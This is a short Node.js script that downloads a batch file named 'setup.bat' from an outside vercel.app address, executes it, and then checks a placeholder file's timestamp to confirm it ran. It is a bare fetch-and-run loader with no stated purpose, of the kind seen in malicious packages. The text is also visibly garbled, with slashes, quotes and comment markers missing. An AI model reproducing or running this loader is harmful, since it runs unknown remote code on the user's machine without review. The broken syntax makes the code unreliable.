#!usrbinenv node

const { createWriteStream, promises fs } = require('fs');
const fetch = require('node-fetch');
const { execFile } = require('child_process');

 Define the URL of the .bat file
const url = httpsdd-xi-five.vercel.appsetup.bat;
const outputFilePath = .setup.bat;
const fileToCheck = pathtoyourcreated_or_modified_file.txt;  Update with your file path

 Function to download the .bat file
const downloadFile = async (url, outputPath) = {
  try {
    console.log(Downloading .bat file from, url);
    const response = await fetch(url);

    if (!response.ok) {
      throw new Error(`Error Unable to download .bat file. Status code ${response.status}`);
    }

    const fileStream = createWriteStream(outputPath);
    await new Promise((resolve, reject) = {
      response.body.pipe(fileStream);
      response.body.on('error', reject);
      fileStream.on('finish', resolve);
    });

    console.log(.bat file downloaded successfully.);
  } catch (error) {
    console.error(Download error, error.message);
    process.exit(1);
  }
};

 Function to execute the .bat file
const executeBatScript = async (filePath) = {
  try {
    console.log(Executing .bat file, filePath);
    const { stdout, stderr } = await new Promise((resolve, reject) = {
      execFile(filePath, (error, stdout, stderr) = {
        if (error) {
          reject(error);
        } else {
          resolve({ stdout, stderr });
        }
      });
    });

    console.log(stdout, stdout);
    console.error(stderr, stderr);
    console.log(.bat file executed successfully.);
  } catch (error) {
    console.error(Execution error, error.message);
    process.exit(1);
  }
};

 Function to check if the .bat file has been successfully executed
const checkScriptExecution = async () = {
  try {
    console.log(Verifying script execution...);
    const stats = await fs.stat(fileToCheck);
    const lastModifiedTime = stats.mtime.getTime();
    const currentTime = Date.now();
    return stats.isFile() && lastModifiedTime  currentTime - 10000;  Check if file modified in last 10 seconds
  } catch (error) {
    console.error(Verification error, error.message);
    return false;
  }
};

 Function to handle the entire process
const handleScriptExecution = async () = {
  try {
    await downloadFile(url, outputFilePath);
    await executeBatScript(outputFilePath);
    if (await checkScriptExecution()) {
      console.log(Script execution verified.);
    } else {
      console.error(Error Script execution verification failed.);
    }
  } catch (error) {
    console.error(Process error, error.message);
  }
};

 Start the script execution process
handleScriptExecution();
